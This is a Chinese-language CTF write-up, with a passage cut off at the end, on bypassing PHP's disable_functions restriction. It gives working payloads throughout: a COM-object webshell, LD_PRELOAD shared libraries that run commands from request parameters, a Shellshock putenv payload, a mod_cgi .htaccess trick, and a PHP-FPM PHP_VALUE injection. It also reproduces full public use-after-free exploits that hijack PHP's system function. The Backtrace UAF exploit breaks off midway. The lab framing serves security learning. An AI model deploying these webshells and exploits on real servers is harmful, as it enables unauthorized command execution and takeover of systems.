disable_functions
PHP的disable_functions配置可以用来设置PHP环境禁止使用某些函数,通常是网站管理员为了安全起见用来禁用某些危险的命令执行函数,通常网站不会禁用phpinfo,因此可以通过phpinfo函数检查环境配置漏过了哪些函数,如利用windows的COM对象,这需要php开启了php_com_dotnet.dll,从phpinfo中查看com.allow_dcom可判断是否开启dcom,payload如下:
<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>

1.LD_PRELOAD
LD_PRELOAD是linux系统的一个环境变量,它可以影响程序的运行时的链接,允许定义在程序前优先加载的动态链接库,linux的动态链接库是.so文件,可以利用LD_PRELOAD来加载一个.so文件,覆盖正常的函数库中的函数,从而实现代码注入。
因此可以使用mail函数,此函数会使用execve在父进程中fork一个子进程,调用/usr/sbin/sendmail,sendmail中又调用了getuid,所以可以编写一个动态库覆盖getuid函数。
payload:
#include <stdio.h>
int getuid() {
    unsetenv("LD_PRELOAD");
    system("echo sussess > res");
    return 0;
}
调整LD_PRELOAD变量,并调用PHP mail函数发送邮件,即可触发加载动态链接库,从而执行代码。
-
__attribute__是GNU C里一种特殊的语法,语法格式为:__attribute__((attribute-list)),若函数被设定为constructor属性,则该函数会在main()函数执行之前被自动的执行。类似的,若函数被设定为destructor属性,则该函数会在main()函数执行之后或者exit()被调用后被自动的执行。所以__attribute__((constructor))在加载共享库时就会运行。只要编写一个含__attribute__((constructor))函数的共享库,设置好LD_PRELOAD变量,并且有一个能fork一个子进程并触发加载共享库的函数被执行,就能执行任意代码达到bypass disable_functions。
payload:
#include <stdio.h>
__attribute__((constructor)) void my_init() {
    unsetenv("LD_PRELOAD");
    system("echo sussess > res");
}
调整LD_PRELOAD变量,并调用PHP mail函数发送邮件,即可触发加载动态链接库,从而执行代码。
-
通用payload:
evil.c
#include<stdlib.h>
__attribute__((constructor)) void l3yx(){
    unsetenv("LD_PRELOAD");
    system(getenv("_evilcmd"));
}
evil.php
<?php
$shell = $_GET['shell']." > /var/www/html/output.txt 2>&1";
putenv("_evilcmd=$shell");
putenv("LD_PRELOAD=./evil.so");
if (function_exists('mail')) {
    mail('a', 'a', 'a', 'a');
} else {
    error_log('a', 1, 'dummy@example.com'); 
}
echo "<pre>".file_get_contents("/var/www/html/output.txt")."</pre>";
gcc -shared -fPIC -o evil.so evil.c
使用条件:
需要有putenv函数来指定LD变量,putenv("LD_PRELOAD=/tmp/evil.so");
需要能够fork一个子进程的函数,如mail和error_log函数
存在可写的目录能够上传.so文件
-
现在来看题目,首先已经给出了一句话木马,蚁剑连上去即可
![LD_PRELOAD 1](/ctfhub/images/web1.png)
但后续发现无法在虚拟终端执行命令,因此将编译后的so文件与新的php文件都上传
![LD_PRELOAD 2](/ctfhub/images/web2.png)
获得flag,当然也可以直接使用蚁剑的绕过插件,不过做题最好还是懂得原理后再使用插件更好
![LD_PRELOAD 3](/ctfhub/images/web3.png)

2.ShellShock
Bash4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞,向环境变量值内的函数定义后添加多余的字符串会触发此漏洞,攻击者可利用此漏洞改变或绕过环境限制,以执行任意的shell命令,甚至完全控制目标系统。
payload：
env x='() { :; }; echo 1' bash -c "echo 1"
存在漏洞时输出有shellshock
父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后,在子进程中调用该字符串时将其理解为函数执行
当bash在初始化环境变量时,语法解析器发现小括号和大括号,就认为它是一个函数定义
say_hell='() { echo hello world; }'
export say_hello
bash -c 'say_hello'
>>hello world
在新的bash进程中,say_hello成为了新环境中的一个函数
1、新的bash在初始化时,扫描到环境变量say_hello出现小括号和大括号,认为它是一个函数定义
2、bash把say_hello作为函数名,值作为函数体
分析源码可得知,bash初始化时调用了builtins/evalstring.c里的parse_and_execute函数,解析字符串输入并执行,但是又未对变量进行截取、过滤,导致读到}时没有结束,从而导致命令执行。
使用条件:
bash版本小于4.3
攻击者可控制环境变量
新的bash进程被打开触发漏洞并执行命令
-
现在来看题目,在PHP webshell的环境下,基于以上使用条件,我们需要满足这几个函数的使用
putenv控制环境变量
mail or error_log来fork子进程触发bash命令执行
bash版本小于4.3
sh默认的shell是bash
payload:
<?php
function runcmd($c){
  $d = dirname($_SERVER["SCRIPT_FILENAME"]);
  if(substr($d, 0, 1) == "/" && function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))){
    putenv("PHP_LOL=() { :; }; $c > /var/www/html/output.txt 2>&1");  //putenv控制环境变量
    if (function_exists('error_log')) {  //触发漏洞
        error_log("a", 1);
    }else{
        mail("a", "a", "a", "a");
    }
    echo "<pre>".file_get_contents("/var/www/html/output.txt")."</pre>";
  }else{
    print("不满足使用条件");
  }
}
runcmd($_REQUEST["cmd"]); // ?cmd=whoami
?>
首页已经给出ant的连接密码
![ShellShock 1](/ctfhub/images/web4.png)
蚁剑连接后上传shellshock
![ShellShock 2](/ctfhub/images/web5.png)
获得flag,能用插件自动绕过
![ShellShock 3](/ctfhub/images/web6.png)

3.Apache Mod CGI
CGI,即公共网关接口,它是web服务器与CGI程序之间传递信息的借口,通过CGI接口web服务器就能够将客户端提交的信息转交给服务器端的CGI程序进行处理,最后返回结果给客户端。
MOD_CGI是Apache的一个模块,它指示任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都被传递给CGI程序处理,输出将返回给客户端。有两种途径可以使文件成功CGI脚本,一种是文件具有已由AddType指令指定的MIME类型,另一种是文件位于ScriptAlias指定的目录中。
使用条件:
Linux系统
使用的apache加上php
apache开启了cgi,rewrite
web目录给了AllowOverride权限
当前目录可写
-
因此想使得服务器将自定义的后缀解析为cgi程序,可以在目的目录下使用.htaccess文件进行配置,即需要AllowOverride权限的原因
.htaccess文件内容如下:
Options +ExecCGI
AddHandler cgi-script .wors
然后上传.wors文件后缀的shell脚本即可触发任意命令执行
-
现在来看题目,已经有了一句话木马,蚁剑连接,当然也可以观察一下phpinfo()
![Apache Mod CGI 1](/ctfhub/images/web7.png)
然后上传.htaccess和shell脚本,注意shell脚本的执行权限
![Apache Mod CGI 2](/ctfhub/images/web8.png)
然后网页访问脚本即可getflag(忘记截图了),蚁剑的绕过插件也已经打包了,直接使用即可

4.PHP-FPM
PHP-FPM,又名FastCGI进程管理器,服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给PHP-FPM进程,PHP-FPM按照fastcgi的协议将TCP流解析成真正的数据。而fastcgi协议就是一个通信协议,和HTTP、TCP等通信协议一样,都是基于字节流的协议,拥有header和body。因此,中间件按照它的规则封装好发送给后端,CGI程序则通过协议具体数据进行指定操作,将输出结果封装好返回中间件。格式如下:
typedef struct {
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 本次record的类型
  unsigned char requestIdB1; // 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; // 额外块大小
  unsigned char reserved; 

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;
头由8个uchar类型的变量组成,每个变量1字节。其中,requestId占两个字节,一个唯一的标志id,以避免多个请求之间的影响contentLength占两个字节,表示body的大小。
语言端解析了fastcgi头以后,拿到contentLength,然后再在TCP流里读取大小等于contentLength的数据,这就是body体。
Body后面还有一段额外的数据(Padding),其长度由头中的paddingLength指定,起保留作用。不需要该Padding的时候，将其长度设置为0即可。
可见,一个fastcgi record结构最大支持的body大小是2^16,也就是65536字节。
其中的type字段指定了record的类型,重要的是类型4,当后端语言接收到一个type为4的record后,就会把这个record的body按照对应的结构解析成key-value对,这就是环境变量。环境变量的结构如下:
typedef struct {
  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair11;
 
typedef struct {
  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair14;
 
typedef struct {
  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair41;
 
typedef struct {
  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair44;
这其实是4个结构,至于用哪个结构,有如下规则:
key、value均小于128字节,用FCGI_NameValuePair11
key大于128字节,value小于128字节,用FCGI_NameValuePair41
key小于128字节,value大于128字节,用FCGI_NameValuePair14
key、value均大于128字节,用FCGI_NameValuePair44
-
因此,但用户访问网页时,中间件会把访问请求转变为fastcgi协议,假设访问的是http://127.0.0.1/index.php?a=1&b=2,这个请求会变成如下key-value:
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
这个数组其实就是PHP中$_SERVER数组的一部分,也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组,也是告诉fpm:“我要执行哪个PHP文件”。
PHP-FPM拿到fastcgi的数据包后,进行解析,得到上述这些环境变量。然后,执行SCRIPT_FILENAME的值指向的PHP文件,也就是/var/www/html/index.php。
而对php-fpm的利用方法也就呼之欲出,PHP-FPM默认监听9000端口,如果这个端口暴露在公网,则可以自己构造fastcgi协议,和fpm进行通信。
此时,SCRIPT_FILENAME的值就格外重要,因为fpm是根据这个值来执行php文件的,如果这个文件不存在,fpm会直接返回404
主要是fpm的默认配置中增加了一个选项security.limit_extensions,限定了只有某些后缀的文件允许被fpm执行,默认是.php。
由于这个配置项的限制,如果想利用PHP-FPM的未授权访问漏洞,首先就得找到一个已存在的PHP文件。
-
当然,能够控制fastcgi协议通信的内容并不能执行任意php代码,还需要auto_prepend_file和auto_append_file配置项。auto_prepend_file是告诉PHP,在执行目标文件之前,先包含auto_prepend_file中指定的文件;auto_append_file是告诉PHP,在执行完成目标文件后,包含auto_append_file指向的文件。
假设设置auto_prepend_file为php://input,那么就等于在执行任何php文件前都要包含一遍POST的内容。所以,只需要把待执行的代码放在Body中,他们就能被执行了。还需要开启远程文件包含选项allow_url_include。
PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量可以用来设置PHP配置项的,PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项,PHP_ADMIN_VALUE可以设置所有选项。所以构造payload如下:
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
设置auto_prepend_file = php://input且allow_url_include = On,然后将我们需要执行的代码放在Body中,即可执行任意代码。
-
现在来看题目,我们已经获得了可用于连接的一句话木马,但disable_functions限制了可用于执行系统命令的函数,如果只使用php未授权访问漏洞来执行命令,这种情况还是原来的php解释器来解析,依然会加载php.ini,从而导致disable_functions完全加载限制利用。分析蚁剑的绕过插件可以得知,可以利用php-fpm加载一个恶意的ext,新启动一个php server,让流量通过.antproxy.php转发到无disabe_functions的PHP Server上,以此达成bypass。
我们需要存在可写的目录,能够上传.so文件,使用php-fpm
-
已经有了一句话木马,蚁剑连接
![PHP-FPM 1](/ctfhub/images/web9.png)
插件利用
![PHP-FPM 2](/ctfhub/images/web10.png)
getflag
![PHP-FPM 3](/ctfhub/images/web11.png)

5.GC UAF
UAF
UAF漏洞（Use-After-Free）是一种内存破坏漏洞,漏洞成因是一块堆内存被释放了之后又被使用。又被使用指的是:指针存在（悬垂指针被引用）。这个引用的结果是不可预测的,因为不知道会发生什么。由于大多数的堆内存其实都是C++对象,所以利用的核心思路就是分配堆去占坑,占的坑中有自己构造的虚表。
悬垂指针:悬垂指针是指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针。比如一个对象的指针,如果这个对象已经被释放或者回收但是指针没有进行任何的修改仍然执行已被释放的内存,这个指针就叫做悬垂指针。
-
此漏洞利用PHP垃圾收集器(garbage collector)中存在三年的一个bug,通过PHP垃圾收集器中堆溢出来绕过disable_functions并执行系统命令。
需要php版本在7.0-7.3
参考exploit
<?php

# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1

pwn("tac /flag");            // 可替换成需要执行的命令

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}
-
已经有了一句话木马,蚁剑连接
![GC UAF 1](/ctfhub/images/web12.png)
上传exploit
![GC UAF 2](/ctfhub/images/web13.png)
getflag
![GC UAF 3](/ctfhub/images/web14.png)

6.Json Serialization UAF
此漏洞利用json序列化程序中的释放后使用漏洞,利用json序列化程序中的堆溢出触发,以绕过disable_functions和执行系统命令。尽管不能保证成功,但它应该相当可靠的在所有服务器api上使用。
Linux 操作系统
PHP 7.1 - all versions to date
7.2 < 7.2.19 (released: 30 May 2019)
7.3 < 7.3.6 (released: 30 May 2019)
exploit:
<?php

$cmd = "tac /flag";        // 可替换成需要执行的命令

$n_alloc = 10; # increase this value if you get segfaults

class MySplFixedArray extends SplFixedArray {
    public static $leak;
}

class Z implements JsonSerializable {
    public function write(&$str, $p, $v, $n = 8) {
      $i = 0;
      for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
      }
    }

    public function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    public function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    # unable to leak ro segments
    public function leak1($addr) {
        global $spl1;

        $this->write($this->abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }

    # the real deal
    public function leak2($addr, $p = 0, $s = 8) {
        global $spl1, $fake_tbl_off;

        # fake reference zval
        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)

        $leak = strlen($spl1::$leak);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }

        return $leak;
    }

    public function parse_elf($base) {
        $e_type = $this->leak2($base, 0x10, 2);

        $e_phoff = $this->leak2($base, 0x20);
        $e_phentsize = $this->leak2($base, 0x36, 2);
        $e_phnum = $this->leak2($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this->leak2($header, 0, 4);
            $p_flags = $this->leak2($header, 4, 4);
            $p_vaddr = $this->leak2($header, 0x10);
            $p_memsz = $this->leak2($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    public function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = $this->leak2($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = $this->leak2($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    public function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->leak2($addr);
            $f_name = $this->leak2($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return $this->leak2($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    public function jsonSerialize() {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = new DateInterval('PT1S');

        $room = [];
        for($i = 0; $i < $n_alloc; $i++)
            $room[] = new Z();

        $_protector = $this->ptr2str(0, 78);

        $this->abc = $this->ptr2str(0, 79);
        $p = new DateInterval('PT1S');

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";

        $x = new DateInterval('PT1S');
        $x->d = 0x2000;
        $x->h = 0xdeadbeef;
        # $this->abc is now of size 0x2000

        if($this->str2ptr($this->abc) != 0xdeadbeef) {
            die('UAF failed.');
        }

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        # some leaks
        $class_entry = $this->str2ptr($this->abc, 0x120);
        $handlers = $this->str2ptr($this->abc, 0x128);
        $php_heap = $this->str2ptr($this->abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        # create a fake class_entry
        $fake_obj = $abc_addr;
        $this->write($this->abc, 0, 2); # type
        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry

        # copy some of class_entry definition
        for($i = 0; $i < 16; $i++) {
            $this->write($this->abc, 0x10 + $i * 8, 
                $this->leak1($class_entry + 0x10 + $i * 8));
        }

        # fake static members table
        $fake_tbl_off = 0x70 * 4 - 16;
        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);

        # fake zval_reference
        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)

        # look for binary base
        $binary_leak = $this->leak2($handlers + 0x10);
        if(!($base = $this->get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }

        # parse elf header
        if(!($elf = $this->parse_elf($base))) {
            die("Couldn't parse ELF");
        }

        # get basic_functions address
        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }

        # find system entry
        if(!($zif_system = $this->get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
        
        # copy hashtable offsetGet bucket
        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this->str2ptr($this->abc, 0x50);
        for($i = 0; $i < 4; $i++) {
            $this->write($this->abc, $fake_bkt_off + $i * 8, 
                $this->leak2($function_data + 0x40 * 4, $i * 8));
        }

        # create a fake bucket
        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this->write($this->abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i < 3; $i++) {
            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
        }

        # copy bucket zval
        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
        for($i = 0; $i < 12; $i++) {
            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, 
                $this->leak2($function_zval, $i * 8));
        }

        # pwn
        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);

        $spl1->offsetGet($cmd);

        exit();
    }
}

$y = [new Z()];
json_encode([&$y]);
-
蚁剑链接
![Json Serialization UAF 1](/ctfhub/images/web15.png)
上传exploit
![Json Serialization UAF 2](/ctfhub/images/web16.png)
访问exploit
![Json Serialization UAF 3](/ctfhub/images/web17.png)

7.Backtrace UAF
该漏洞利用在debug_backtrace()函数中使用了两年的一个bug。我们可以诱使它返回对已被破坏的变量的引用,从而导致释放后使用漏洞。
Linux 操作系统
PHP 版本•7.0 - all versions to date
7.1 - all versions to date
7.2 - all versions to date
7.3 < 7.3.15 (released 20 Feb 2020)
7.4 < 7.4.3 (released 20 Feb 2020)
exploit:
<?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

pwn("tac /flag");            // 可替换成需要执行的命令

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
